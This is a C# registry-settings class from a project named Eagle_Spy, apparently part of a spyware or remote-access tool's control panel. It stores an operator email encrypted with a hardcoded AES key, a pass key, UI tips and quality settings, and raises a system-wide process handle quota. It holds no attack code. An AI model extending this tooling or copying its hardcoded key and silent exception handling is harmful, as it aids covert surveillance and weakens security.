using System;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Eagle_Spy;

[StandardModule]
internal sealed class RegistryHandler
{
	private static string mainpath = "Software\\\\EagleSpy";

	public static string ShowScrenShotTip = "STIP";

	public static string ShowScrenReadTip = "SRETIP";

	public static string Selectedsound = "SOUND";

	public static string Selectedqulity = "Quality";

	public static void iniliz()
	{
		try
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			try
			{
				if (registryKey2 == null)
					registryKey2 = registryKey.CreateSubKey(mainpath);
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				//////CraxsAlert.Showinformation("Sorry");
			}
			registryKey2.Close();
			registryKey.Close();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError2);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	public static string Get_EMAIL()
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			using RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("EmailV6"));
			if (objectValue != null)
				return Codes.AES_Decrypt(registryKey2.GetValue("EmailV6").ToString(), "W3Ndxet0sdZYtqykGiGCeiIMDoF");
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return null;
	}

	public static void Set_EMAIL(string key)
	{
		try
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			Set_OldEmail(key);
			registryKey2.SetValue("EmailV6", Codes.Encrypt(key, "W3Ndxet0sdZYtqykGiGCeiIMDoF"));
			registryKey2.Close();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	public static void Set_OldEmail(string key)
	{
		try
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			registryKey2.SetValue("Email", key);
			registryKey2.Close();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	public static string getworning()
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			using RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("wrn"));
			if (objectValue != null)
				return registryKey2.GetValue("wrn").ToString();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return null;
	}

	public static void setworning(string key)
	{
		try
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			registryKey2.SetValue("wrn", key);
			registryKey2.Close();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	public static string getwtipanti()
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			using RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("tipanti"));
			if (objectValue != null)
				return registryKey2.GetValue("tipanti").ToString();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return null;
	}

	public static void settipanti(string key)
	{
		try
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			registryKey2.SetValue("tipanti", key);
			registryKey2.Close();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	public static string Get_ID_ASSIST()
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			using RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("ID"));
			if (objectValue != null)
				return registryKey2.GetValue("ID").ToString();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return null;
	}

	public static void Set_ID_ASSIST(string key)
	{
		try
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			registryKey2.SetValue("ID", key);
			registryKey2.Close();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	public static string GET_FTtip()
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			using RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("TipFT"));
			if (objectValue != null)
				return registryKey2.GetValue("TipFT").ToString();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return null;
	}

	public static void Set_FTtip(string key)
	{
		try
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			registryKey2.SetValue("TipFT", key);
			registryKey2.Close();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	public static string Get_Language()
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			using RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("UserLanguage"));
			if (objectValue != null)
				return registryKey2.GetValue("UserLanguage").ToString();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return null;
	}

	public static void Set_Language(string key)
	{
		try
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			registryKey2.SetValue("UserLanguage", key);
			registryKey2.Close();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	public static string GET_Tip(string id)
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			using RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue(id));
			if (objectValue != null)
				return registryKey2.GetValue(id).ToString();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return null;
	}

	public static void SET_Tip(string key, string id)
	{
		try
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			registryKey2.SetValue(id, key);
			registryKey2.Close();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	public static string GET_SoundID()
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			using RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue(Selectedsound));
			if (objectValue != null)
				return registryKey2.GetValue(Selectedsound).ToString();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return null;
	}

	public static void SET_qulity(string key, string id)
	{
		try
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			registryKey2.SetValue(id, key);
			registryKey2.Close();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	public static string GET_qulity()
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			using RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue(Selectedqulity));
			if (objectValue != null)
				return registryKey2.GetValue(Selectedqulity).ToString();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return null;
	}

	public static void SET_SoundID(string id)
	{
		try
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			registryKey2.SetValue(Selectedsound, id);
			registryKey2.Close();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	public static string passkey()
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			using RegistryKey registryKey2 = registryKey.OpenSubKey(mainpath, writable: true);
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("SK"));
			if (objectValue != null)
				return registryKey2.GetValue("SK").ToString();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return "";
	}

	public static void SetUserHandleLimit()
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name, writable: true);
			registryKey.SetValue("USERProcessHandleQuota", 18000, RegistryValueKind.DWord);
			registryKey.Close();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}
}
